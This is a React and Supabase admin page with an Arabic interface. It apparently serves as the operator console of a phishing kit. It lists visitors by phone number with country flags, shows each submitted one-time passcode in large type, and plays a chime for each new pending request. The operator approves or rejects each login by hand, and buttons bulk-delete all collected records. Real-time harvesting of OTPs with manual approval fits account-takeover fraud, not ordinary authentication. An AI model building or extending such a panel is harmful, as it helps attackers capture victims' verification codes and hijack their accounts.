import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import { Shield, Check, X, RefreshCw, Clock, Phone, KeyRound, User, ChevronRight, Filter, Search, Calendar, Hash, Trash2, Wifi, WifiOff } from "lucide-react";
import { Input } from "@/components/ui/input";
import { useRef, useCallback } from "react";
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";

const playNotificationSound = () => {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "sine";
    // Two-tone chime
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.15);
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.4);
  } catch (e) {
    // Audio not supported
  }
};

interface LoginRequest {
  id: string;
  phone: string;
  otp_code: string;
  status: string;
  created_at: string;
  updated_at: string;
}

interface Visitor {
  phone: string;
  requests: LoginRequest[];
}

type StatusFilter = "all" | "pending" | "approved" | "rejected";
type OnlineFilter = "all" | "online" | "offline";

const ONLINE_THRESHOLD_MS = 5 * 60 * 1000; // 5 minutes

const isVisitorOnline = (requests: LoginRequest[]) => {
  if (requests.length === 0) return false;
  const latest = new Date(requests[0].created_at).getTime();
  return Date.now() - latest < ONLINE_THRESHOLD_MS;
};

const COUNTRY_FLAGS: Record<string, { flag: string; name: string }> = {
  "974": { flag: "🇶🇦", name: "قطر" },
  "966": { flag: "🇸🇦", name: "السعودية" },
  "971": { flag: "🇦🇪", name: "الإمارات" },
  "973": { flag: "🇧🇭", name: "البحرين" },
  "965": { flag: "🇰🇼", name: "الكويت" },
  "968": { flag: "🇴🇲", name: "عُمان" },
  "962": { flag: "🇯🇴", name: "الأردن" },
  "961": { flag: "🇱🇧", name: "لبنان" },
  "964": { flag: "🇮🇶", name: "العراق" },
  "20": { flag: "🇪🇬", name: "مصر" },
  "212": { flag: "🇲🇦", name: "المغرب" },
  "216": { flag: "🇹🇳", name: "تونس" },
  "213": { flag: "🇩🇿", name: "الجزائر" },
  "218": { flag: "🇱🇾", name: "ليبيا" },
  "249": { flag: "🇸🇩", name: "السودان" },
  "967": { flag: "🇾🇪", name: "اليمن" },
  "963": { flag: "🇸🇾", name: "سوريا" },
  "970": { flag: "🇵🇸", name: "فلسطين" },
  "91": { flag: "🇮🇳", name: "الهند" },
  "92": { flag: "🇵🇰", name: "باكستان" },
  "63": { flag: "🇵🇭", name: "الفلبين" },
  "977": { flag: "🇳🇵", name: "نيبال" },
  "94": { flag: "🇱🇰", name: "سريلانكا" },
  "880": { flag: "🇧🇩", name: "بنغلاديش" },
  "1": { flag: "🇺🇸", name: "أمريكا" },
  "44": { flag: "🇬🇧", name: "بريطانيا" },
};

const getCountryFromPhone = (phone: string): { flag: string; name: string } | null => {
  const cleaned = phone.replace(/[^0-9+]/g, "").replace(/^\+/, "");
  for (const code of Object.keys(COUNTRY_FLAGS).sort((a, b) => b.length - a.length)) {
    if (cleaned.startsWith(code)) return COUNTRY_FLAGS[code];
  }
  return null;
};

const Admin = () => {
  const [requests, setRequests] = useState<LoginRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedPhone, setSelectedPhone] = useState<string | null>(null);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [statusFilter, setStatusFilter] = useState<StatusFilter>("all");
  const [onlineFilter, setOnlineFilter] = useState<OnlineFilter>("all");
  const [searchQuery, setSearchQuery] = useState("");
  const prevRequestCountRef = useRef<number | null>(null);
  const isFirstLoadRef = useRef(true);
  const [, setTick] = useState(0);

  const fetchRequests = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("login_requests")
      .select("*")
      .order("created_at", { ascending: false });

    if (error) {
      toast.error("خطأ في جلب البيانات");
    } else {
      const newData = data || [];
      // Play sound on new pending requests (not on first load)
      if (!isFirstLoadRef.current && prevRequestCountRef.current !== null) {
        const newPending = newData.filter(r => r.status === "pending").length;
        const oldPending = requests.filter(r => r.status === "pending").length;
        if (newPending > oldPending) {
          playNotificationSound();
          toast.info("طلب جديد!", { duration: 3000 });
        }
      }
      isFirstLoadRef.current = false;
      prevRequestCountRef.current = newData.length;
      setRequests(newData);
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchRequests();
    const channel = supabase
      .channel("login_requests_realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "login_requests" }, () => {
        fetchRequests();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);

  // Group requests by phone
  const allVisitors: Visitor[] = Object.values(
    requests.reduce((acc: Record<string, Visitor>, req) => {
      if (!acc[req.phone]) acc[req.phone] = { phone: req.phone, requests: [] };
      acc[req.phone].requests.push(req);
      return acc;
    }, {})
  );

  // Apply filters and sort (pending first)
  const visitors = allVisitors.filter((v) => {
    const matchesSearch = searchQuery === "" || v.phone.includes(searchQuery);
    const matchesStatus = statusFilter === "all" || v.requests.some(r => r.status === statusFilter);
    const online = isVisitorOnline(v.requests);
    const matchesOnline = onlineFilter === "all" || (onlineFilter === "online" ? online : !online);
    return matchesSearch && matchesStatus && matchesOnline;
  }).sort((a, b) => {
    const aPending = a.requests.some(r => r.status === "pending") ? 1 : 0;
    const bPending = b.requests.some(r => r.status === "pending") ? 1 : 0;
    return bPending - aPending;
  });

  const selectedVisitor = allVisitors.find((v) => v.phone === selectedPhone) || null;

  const updateStatus = async (id: string, status: "approved" | "rejected") => {
    const { error } = await supabase
      .from("login_requests")
      .update({ status, updated_at: new Date().toISOString() })
      .eq("id", id);

    if (error) {
      toast.error("خطأ في تحديث الحالة");
    } else {
      toast.success(status === "approved" ? "تمت الموافقة" : "تم الرفض");
    }
  };

  const clearAllData = async () => {
    const { error } = await supabase.from("login_requests").delete().neq("id", "00000000-0000-0000-0000-000000000000");
    if (error) {
      toast.error("خطأ في مسح البيانات");
    } else {
      toast.success("تم مسح جميع البيانات");
      setSelectedPhone(null);
    }
  };

  const clearOfflineVisitors = async () => {
    const offlinePhones = allVisitors
      .filter(v => !isVisitorOnline(v.requests))
      .map(v => v.phone);
    if (offlinePhones.length === 0) {
      toast.info("لا يوجد زوار غير متصلين");
      return;
    }
    const { error } = await supabase.from("login_requests").delete().in("phone", offlinePhones);
    if (error) {
      toast.error("خطأ في مسح البيانات");
    } else {
      toast.success(`تم مسح بيانات ${offlinePhones.length} زائر غير متصل`);
      if (selectedPhone && offlinePhones.includes(selectedPhone)) setSelectedPhone(null);
    }
  };

  const deleteVisitorData = async (phone: string) => {
    const { error } = await supabase.from("login_requests").delete().eq("phone", phone);
    if (error) {
      toast.error("خطأ في مسح بيانات الزائر");
    } else {
      toast.success("تم مسح بيانات الزائر");
      if (selectedPhone === phone) setSelectedPhone(null);
    }
  };

  const deleteVisitorRequest = async (id: string) => {
    const { error } = await supabase.from("login_requests").delete().eq("id", id);
    if (error) {
      toast.error("خطأ في مسح الطلب");
    } else {
      toast.success("تم مسح الطلب");
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case "pending":
        return <Badge variant="outline" className="bg-warning/10 text-warning border-warning/30 gap-1 text-xs"><Clock className="h-3 w-3" /> معلق</Badge>;
      case "approved":
        return <Badge variant="outline" className="bg-success/10 text-success border-success/30 gap-1 text-xs"><Check className="h-3 w-3" /> موافق</Badge>;
      case "rejected":
        return <Badge variant="outline" className="bg-destructive/10 text-destructive border-destructive/30 gap-1 text-xs"><X className="h-3 w-3" /> مرفوض</Badge>;
      default:
        return <Badge variant="outline">{status}</Badge>;
    }
  };

  const formatTime = (dateStr: string) => {
    return new Date(dateStr).toLocaleString("ar-QA", {
      year: "numeric", month: "short", day: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
    });
  };

  const formatDate = (dateStr: string) => {
    return new Date(dateStr).toLocaleDateString("ar-QA", {
      year: "numeric", month: "long", day: "numeric",
    });
  };

  // Tick every 30s to update time-ago displays
  useEffect(() => {
    const interval = setInterval(() => setTick(t => t + 1), 30000);
    return () => clearInterval(interval);
  }, []);

  const getWaitingTime = (reqs: LoginRequest[]) => {
    const pendingReqs = reqs.filter(r => r.status === "pending");
    if (pendingReqs.length === 0) return "";
    const oldest = pendingReqs.reduce((a, b) => new Date(a.created_at) < new Date(b.created_at) ? a : b);
    const diffMs = Date.now() - new Date(oldest.created_at).getTime();
    const mins = Math.floor(diffMs / 60000);
    if (mins < 1) return "الآن";
    if (mins < 60) return `${mins} د`;
    const hours = Math.floor(mins / 60);
    if (hours < 24) return `${hours} س ${mins % 60} د`;
    const days = Math.floor(hours / 24);
    return `${days} ي ${hours % 24} س`;
  };

  const pendingCount = (reqs: LoginRequest[]) => reqs.filter(r => r.status === "pending").length;
  const approvedCount = (reqs: LoginRequest[]) => reqs.filter(r => r.status === "approved").length;
  const rejectedCount = (reqs: LoginRequest[]) => reqs.filter(r => r.status === "rejected").length;

  const filterButtons: { key: StatusFilter; label: string; color: string }[] = [
    { key: "all", label: "الكل", color: "text-foreground" },
    { key: "pending", label: "معلق", color: "text-warning" },
    { key: "approved", label: "موافق", color: "text-success" },
    { key: "rejected", label: "مرفوض", color: "text-destructive" },
  ];

  return (
    <div className="min-h-screen bg-background flex" dir="rtl">
      {/* Sidebar - Visitors List */}
      <div className={`${sidebarOpen ? "w-80" : "w-0"} transition-all duration-300 border-l border-border bg-card flex flex-col overflow-hidden`}>
        {/* Sidebar Header */}
        <div className="bg-primary p-4 flex items-center gap-3 shrink-0">
          <div className="w-9 h-9 rounded-lg bg-primary-foreground/10 flex items-center justify-center">
            <Shield className="h-4 w-4 text-primary-foreground" />
          </div>
          <div className="flex-1 min-w-0">
            <h1 className="text-sm font-bold text-primary-foreground truncate">لوحة التحكم</h1>
            <p className="text-[10px] text-primary-foreground/60">{allVisitors.length} زائر</p>
          </div>
          <Button variant="ghost" size="icon" onClick={fetchRequests} className="text-primary-foreground/70 hover:text-primary-foreground hover:bg-primary-foreground/10 h-8 w-8">
            <RefreshCw className={`h-4 w-4 ${loading ? "animate-spin" : ""}`} />
          </Button>
          <AlertDialog>
            <AlertDialogTrigger asChild>
              <Button variant="ghost" size="icon" className="text-primary-foreground/70 hover:text-destructive hover:bg-primary-foreground/10 h-8 w-8">
                <Trash2 className="h-4 w-4" />
              </Button>
            </AlertDialogTrigger>
            <AlertDialogContent dir="rtl">
              <AlertDialogHeader>
                <AlertDialogTitle>مسح جميع البيانات</AlertDialogTitle>
                <AlertDialogDescription>
                  هل أنت متأكد من مسح جميع طلبات تسجيل الدخول؟ لا يمكن التراجع عن هذا الإجراء.
                </AlertDialogDescription>
              </AlertDialogHeader>
              <AlertDialogFooter>
                <AlertDialogCancel>إلغاء</AlertDialogCancel>
                <AlertDialogAction onClick={clearAllData} className="bg-destructive text-destructive-foreground hover:bg-destructive/90">
                  مسح الكل
                </AlertDialogAction>
              </AlertDialogFooter>
            </AlertDialogContent>
          </AlertDialog>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-3 gap-2 p-3 shrink-0">
          {[
            { label: "معلق", count: requests.filter(r => r.status === "pending").length, color: "text-warning" },
            { label: "موافق", count: requests.filter(r => r.status === "approved").length, color: "text-success" },
            { label: "مرفوض", count: requests.filter(r => r.status === "rejected").length, color: "text-destructive" },
          ].map((s) => (
            <div key={s.label} className="rounded-lg bg-muted/50 p-2 text-center">
              <p className={`text-lg font-bold ${s.color}`}>{s.count}</p>
              <p className="text-[10px] text-muted-foreground">{s.label}</p>
            </div>
          ))}
        </div>

        {/* Search & Filters */}
        <div className="px-3 pb-2 space-y-2 shrink-0">
          <div className="relative">
            <Search className="absolute right-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
            <Input
              placeholder="بحث برقم الهاتف..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="h-8 text-xs pr-8 bg-muted/50 border-border/50"
              dir="ltr"
            />
          </div>
          <div className="flex gap-1">
            {[
              { key: "all" as OnlineFilter, label: "الكل", icon: null },
              { key: "online" as OnlineFilter, label: "متصل", icon: <Wifi className="h-3 w-3" /> },
              { key: "offline" as OnlineFilter, label: "غير متصل", icon: <WifiOff className="h-3 w-3" /> },
            ].map((f) => (
              <button
                key={f.key}
                onClick={() => setOnlineFilter(f.key)}
                className={`flex-1 text-[10px] font-medium py-1.5 rounded-md transition-all flex items-center justify-center gap-1 ${
                  onlineFilter === f.key
                    ? "bg-primary/10 text-primary border border-primary/20"
                    : "bg-muted/30 text-muted-foreground hover:bg-muted/60 border border-transparent"
                }`}
              >
                {f.icon}{f.label}
              </button>
            ))}
          </div>
          <div className="flex gap-1">
            {filterButtons.map((f) => (
              <button
                key={f.key}
                onClick={() => setStatusFilter(f.key)}
                className={`flex-1 text-[10px] font-medium py-1.5 rounded-md transition-all ${
                  statusFilter === f.key
                    ? "bg-primary/10 text-primary border border-primary/20"
                    : "bg-muted/30 text-muted-foreground hover:bg-muted/60 border border-transparent"
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>
        </div>

        {/* Visitors List */}
        <div className="flex-1 overflow-y-auto">
          <div className="p-2 space-y-1">
            {loading && visitors.length === 0 ? (
              <div className="flex justify-center py-8">
                <div className="w-6 h-6 border-3 border-primary border-t-transparent rounded-full animate-spin" />
              </div>
            ) : visitors.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground text-sm">
                {searchQuery || statusFilter !== "all" ? "لا توجد نتائج" : "لا يوجد زوار"}
              </div>
            ) : (
              visitors.map((visitor) => {
                const hasPending = pendingCount(visitor.requests) > 0;
                const isSelected = selectedPhone === visitor.phone;
                const online = isVisitorOnline(visitor.requests);
                return (
                  <button
                    key={visitor.phone}
                    onClick={() => setSelectedPhone(visitor.phone)}
                    className={`w-full text-right rounded-lg p-3 transition-all flex items-center gap-3 relative overflow-hidden ${
                      hasPending
                        ? isSelected
                          ? "bg-warning/15 border border-warning/30 shadow-sm shadow-warning/10"
                          : "bg-warning/5 border border-warning/20 hover:bg-warning/10 animate-pulse-soft"
                        : isSelected
                          ? "bg-primary/10 border border-primary/20"
                          : "hover:bg-muted/70 border border-transparent"
                    }`}
                  >
                    <div className={`relative w-9 h-9 rounded-full flex items-center justify-center shrink-0 ${
                      hasPending ? "bg-warning/10" : "bg-muted"
                    }`}>
                      <User className={`h-4 w-4 ${hasPending ? "text-warning" : "text-muted-foreground"}`} />
                      <span className={`absolute -top-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-card ${online ? "bg-green-500" : "bg-muted-foreground/40"}`} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-1.5">
                        {getCountryFromPhone(visitor.phone) && (
                          <span className="text-sm" title={getCountryFromPhone(visitor.phone)!.name}>{getCountryFromPhone(visitor.phone)!.flag}</span>
                        )}
                        <p className="text-sm font-semibold text-foreground truncate" dir="ltr">{visitor.phone}</p>
                      </div>
                      <div className="flex items-center gap-2 mt-0.5 flex-wrap">
                        <span className="text-[10px] text-muted-foreground">{visitor.requests.length} طلب</span>
                        {hasPending && (
                          <span className="text-[10px] text-warning font-bold flex items-center gap-0.5">
                            <Clock className="h-2.5 w-2.5 animate-pulse" />
                            ينتظر إجراء ({pendingCount(visitor.requests)}) · {getWaitingTime(visitor.requests)}
                          </span>
                        )}
                        <span className={`text-[10px] flex items-center gap-0.5 ${online ? "text-green-500" : "text-muted-foreground/60"}`}>
                          {online ? <Wifi className="h-2.5 w-2.5" /> : <WifiOff className="h-2.5 w-2.5" />}
                          {online ? "متصل" : "غير متصل"}
                        </span>
                      </div>
                    </div>
                    <div className="flex items-center gap-1 shrink-0">
                      <AlertDialog>
                        <AlertDialogTrigger asChild>
                          <button
                            onClick={(e) => e.stopPropagation()}
                            className="w-7 h-7 rounded-md flex items-center justify-center hover:bg-destructive/10 text-muted-foreground hover:text-destructive transition-colors"
                            title="مسح بيانات الزائر"
                          >
                            <Trash2 className="h-3.5 w-3.5" />
                          </button>
                        </AlertDialogTrigger>
                        <AlertDialogContent dir="rtl" onClick={(e) => e.stopPropagation()}>
                          <AlertDialogHeader>
                            <AlertDialogTitle>مسح بيانات الزائر</AlertDialogTitle>
                            <AlertDialogDescription>
                              سيتم مسح جميع طلبات الزائر {visitor.phone} نهائياً. هل تريد المتابعة؟
                            </AlertDialogDescription>
                          </AlertDialogHeader>
                          <AlertDialogFooter className="flex-row-reverse gap-2">
                            <AlertDialogCancel>إلغاء</AlertDialogCancel>
                            <AlertDialogAction className="bg-destructive text-destructive-foreground hover:bg-destructive/90" onClick={() => deleteVisitorData(visitor.phone)}>
                              مسح
                            </AlertDialogAction>
                          </AlertDialogFooter>
                        </AlertDialogContent>
                      </AlertDialog>
                      <ChevronRight className="h-4 w-4 text-muted-foreground rotate-180" />
                    </div>
                  </button>
                );
              })
            )}
          </div>
        </div>
      </div>

      {/* Toggle Sidebar Button (mobile) */}
      <button
        onClick={() => setSidebarOpen(!sidebarOpen)}
        className="fixed top-4 right-4 z-50 md:hidden w-10 h-10 rounded-lg bg-primary text-primary-foreground flex items-center justify-center shadow-lg"
      >
        <Shield className="h-5 w-5" />
      </button>

      {/* Main Content - Visitor Details */}
      <div className="flex-1 flex flex-col min-h-screen">
        {selectedVisitor ? (
          <>
            {/* Visitor Info Box */}
            <div className={`border-b p-4 ${pendingCount(selectedVisitor.requests) > 0 ? "bg-warning/5 border-warning/20" : "bg-card border-border"}`}>
              <div className="flex items-center gap-3 mb-3">
                <div className={`relative w-12 h-12 rounded-full flex items-center justify-center ${pendingCount(selectedVisitor.requests) > 0 ? "bg-warning/15" : "bg-primary/10"}`}>
                  <User className={`h-6 w-6 ${pendingCount(selectedVisitor.requests) > 0 ? "text-warning" : "text-primary"}`} />
                  <span className={`absolute -top-0.5 -left-0.5 w-3.5 h-3.5 rounded-full border-2 border-card ${isVisitorOnline(selectedVisitor.requests) ? "bg-green-500" : "bg-muted-foreground/40"}`} />
                </div>
                <div className="flex-1">
                  <div className="flex items-center gap-2 flex-wrap">
                    {getCountryFromPhone(selectedVisitor.phone) && (
                      <span className="text-xl" title={getCountryFromPhone(selectedVisitor.phone)!.name}>{getCountryFromPhone(selectedVisitor.phone)!.flag}</span>
                    )}
                    <p className="font-bold text-foreground text-lg" dir="ltr">{selectedVisitor.phone}</p>
                    <span className={`text-[10px] flex items-center gap-1 px-1.5 py-0.5 rounded-full ${isVisitorOnline(selectedVisitor.requests) ? "bg-green-500/10 text-green-500" : "bg-muted text-muted-foreground"}`}>
                      {isVisitorOnline(selectedVisitor.requests) ? <Wifi className="h-2.5 w-2.5" /> : <WifiOff className="h-2.5 w-2.5" />}
                      {isVisitorOnline(selectedVisitor.requests) ? "متصل" : "غير متصل"}
                    </span>
                    {pendingCount(selectedVisitor.requests) > 0 && (
                      <span className="text-[10px] flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-warning/15 text-warning font-bold animate-pulse">
                        <Clock className="h-2.5 w-2.5" />
                        ينتظر إجراء · {getWaitingTime(selectedVisitor.requests)}
                      </span>
                    )}
                  </div>
                  <p className="text-xs text-muted-foreground">
                    أول زيارة: {formatDate(selectedVisitor.requests[selectedVisitor.requests.length - 1].created_at)}
                  </p>
                </div>
                <AlertDialog>
                  <AlertDialogTrigger asChild>
                    <Button variant="ghost" size="sm" className="text-destructive hover:text-destructive hover:bg-destructive/10 gap-1 h-8">
                      <Trash2 className="h-4 w-4" />
                      <span className="text-xs hidden sm:inline">مسح الزائر</span>
                    </Button>
                  </AlertDialogTrigger>
                  <AlertDialogContent dir="rtl">
                    <AlertDialogHeader>
                      <AlertDialogTitle>مسح بيانات الزائر</AlertDialogTitle>
                      <AlertDialogDescription>
                        سيتم مسح جميع طلبات الزائر {selectedVisitor.phone} نهائياً من السيرفر. هل تريد المتابعة؟
                      </AlertDialogDescription>
                    </AlertDialogHeader>
                    <AlertDialogFooter className="flex-row-reverse gap-2">
                      <AlertDialogCancel>إلغاء</AlertDialogCancel>
                      <AlertDialogAction className="bg-destructive text-destructive-foreground hover:bg-destructive/90" onClick={() => deleteVisitorData(selectedVisitor.phone)}>
                        مسح
                      </AlertDialogAction>
                    </AlertDialogFooter>
                  </AlertDialogContent>
                </AlertDialog>
              </div>

              {/* Visitor Stats Cards */}
              <div className="grid grid-cols-4 gap-2">
                <div className="rounded-lg bg-muted/40 p-2 text-center">
                  <div className="flex items-center justify-center gap-1 mb-0.5">
                    <Hash className="h-3 w-3 text-muted-foreground" />
                  </div>
                  <p className="text-sm font-bold text-foreground">{selectedVisitor.requests.length}</p>
                  <p className="text-[9px] text-muted-foreground">إجمالي</p>
                </div>
                <div className="rounded-lg bg-warning/5 p-2 text-center">
                  <div className="flex items-center justify-center gap-1 mb-0.5">
                    <Clock className="h-3 w-3 text-warning" />
                  </div>
                  <p className="text-sm font-bold text-warning">{pendingCount(selectedVisitor.requests)}</p>
                  <p className="text-[9px] text-muted-foreground">معلق</p>
                </div>
                <div className="rounded-lg bg-success/5 p-2 text-center">
                  <div className="flex items-center justify-center gap-1 mb-0.5">
                    <Check className="h-3 w-3 text-success" />
                  </div>
                  <p className="text-sm font-bold text-success">{approvedCount(selectedVisitor.requests)}</p>
                  <p className="text-[9px] text-muted-foreground">موافق</p>
                </div>
                <div className="rounded-lg bg-destructive/5 p-2 text-center">
                  <div className="flex items-center justify-center gap-1 mb-0.5">
                    <X className="h-3 w-3 text-destructive" />
                  </div>
                  <p className="text-sm font-bold text-destructive">{rejectedCount(selectedVisitor.requests)}</p>
                  <p className="text-[9px] text-muted-foreground">مرفوض</p>
                </div>
              </div>
            </div>

            {/* Timeline */}
            <div className="flex-1 overflow-y-auto p-4">
              <div className="max-w-xl mx-auto">
                <h2 className="text-sm font-semibold text-muted-foreground mb-4 flex items-center gap-2">
                  <Clock className="h-4 w-4" /> سجل النشاط
                </h2>
                <div className="relative">
                  <div className="absolute right-[19px] top-0 bottom-0 w-0.5 bg-border" />
                  <div className="space-y-4">
                    {selectedVisitor.requests.map((req) => (
                      <div key={req.id} className="relative flex gap-4">
                        <div className={`relative z-10 w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${
                          req.status === "pending"
                            ? "bg-warning/20 border-2 border-warning"
                            : req.status === "approved"
                            ? "bg-success/20 border-2 border-success"
                            : "bg-destructive/20 border-2 border-destructive"
                        }`}>
                          {req.status === "pending" ? (
                            <Clock className="h-4 w-4 text-warning" />
                          ) : req.status === "approved" ? (
                            <Check className="h-4 w-4 text-success" />
                          ) : (
                            <X className="h-4 w-4 text-destructive" />
                          )}
                        </div>

                        <div className="flex-1 bg-card border border-border rounded-xl p-4 shadow-sm">
                          <div className="flex items-start justify-between mb-3">
                            <div className="text-xs text-muted-foreground">{formatTime(req.created_at)}</div>
                            <div className="flex items-center gap-1">
                              {getStatusBadge(req.status)}
                              <AlertDialog>
                                <AlertDialogTrigger asChild>
                                  <button className="w-6 h-6 rounded flex items-center justify-center hover:bg-destructive/10 text-muted-foreground hover:text-destructive transition-colors">
                                    <Trash2 className="h-3 w-3" />
                                  </button>
                                </AlertDialogTrigger>
                                <AlertDialogContent dir="rtl">
                                  <AlertDialogHeader>
                                    <AlertDialogTitle>مسح الطلب</AlertDialogTitle>
                                    <AlertDialogDescription>سيتم مسح هذا الطلب نهائياً. هل تريد المتابعة؟</AlertDialogDescription>
                                  </AlertDialogHeader>
                                  <AlertDialogFooter className="flex-row-reverse gap-2">
                                    <AlertDialogCancel>إلغاء</AlertDialogCancel>
                                    <AlertDialogAction className="bg-destructive text-destructive-foreground hover:bg-destructive/90" onClick={() => deleteVisitorRequest(req.id)}>مسح</AlertDialogAction>
                                  </AlertDialogFooter>
                                </AlertDialogContent>
                              </AlertDialog>
                            </div>
                          </div>

                          <div className="space-y-2">
                            <div className="flex items-center gap-2">
                              <Phone className="h-3.5 w-3.5 text-muted-foreground" />
                              <span className="text-sm text-foreground" dir="ltr">{req.phone}</span>
                            </div>
                            <div className="flex items-center gap-2">
                              <KeyRound className="h-3.5 w-3.5 text-muted-foreground" />
                              <span className="font-mono text-xl font-bold text-primary tracking-[0.3em]" dir="ltr">{req.otp_code}</span>
                            </div>
                          </div>

                          {req.updated_at !== req.created_at && (
                            <div className="text-[10px] text-muted-foreground mt-2">
                              آخر تحديث: {formatTime(req.updated_at)}
                            </div>
                          )}

                          {req.status === "pending" && (
                            <div className="flex gap-2 mt-3 pt-3 border-t border-border/50">
                              <Button
                                size="sm"
                                className="flex-1 gap-1 bg-success hover:bg-success/90 text-success-foreground h-9"
                                onClick={() => updateStatus(req.id, "approved")}
                              >
                                <Check className="h-4 w-4" />
                                موافقة
                              </Button>
                              <Button
                                size="sm"
                                variant="destructive"
                                className="flex-1 gap-1 h-9"
                                onClick={() => updateStatus(req.id, "rejected")}
                              >
                                <X className="h-4 w-4" />
                                رفض
                              </Button>
                            </div>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </>
        ) : (
          <div className="flex-1 flex items-center justify-center">
            <div className="text-center text-muted-foreground">
              <User className="h-16 w-16 mx-auto mb-4 opacity-20" />
              <p className="text-lg font-medium">اختر زائراً من القائمة</p>
              <p className="text-sm mt-1">لعرض تفاصيل تسجيل الدخول والسجل الكامل</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Admin;
